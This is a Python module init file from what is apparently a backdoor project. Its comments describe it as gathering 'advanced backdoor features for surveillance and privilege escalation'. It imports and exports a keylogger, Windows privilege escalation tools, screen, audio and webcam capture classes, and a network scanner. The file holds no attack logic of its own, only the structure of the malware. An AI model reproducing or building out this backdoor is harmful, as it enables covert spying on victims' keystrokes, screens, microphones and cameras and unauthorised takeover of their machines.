# Features Module
# Contains all advanced backdoor features for surveillance and privilege escalation

# Import keylogger components
from .keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE

# Import privilege escalation module (Windows-focused)
from .privilege_escalation import PrivilegeEscalation

# Import media capture tools (screenshots, audio, webcam, screen recording)
from .media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture

# Import network discovery and scanning tools
from .network_discovery import NetworkDiscovery

# Export all feature classes for easy importing
__all__ = [
    'Keylogger',              # Main keylogger with pynput
    'FallbackKeylogger',      # Fallback keylogger without pynput
    'PYNPUT_AVAILABLE',       # Flag indicating if pynput is installed
    'PrivilegeEscalation',    # Windows privilege escalation tools
    'ScreenCapture',          # Screenshot capture functionality
    'AudioCapture',           # Audio recording functionality
    'WebcamCapture',          # Webcam image/video capture
    'NetworkDiscovery',       # Network scanning and discovery
]
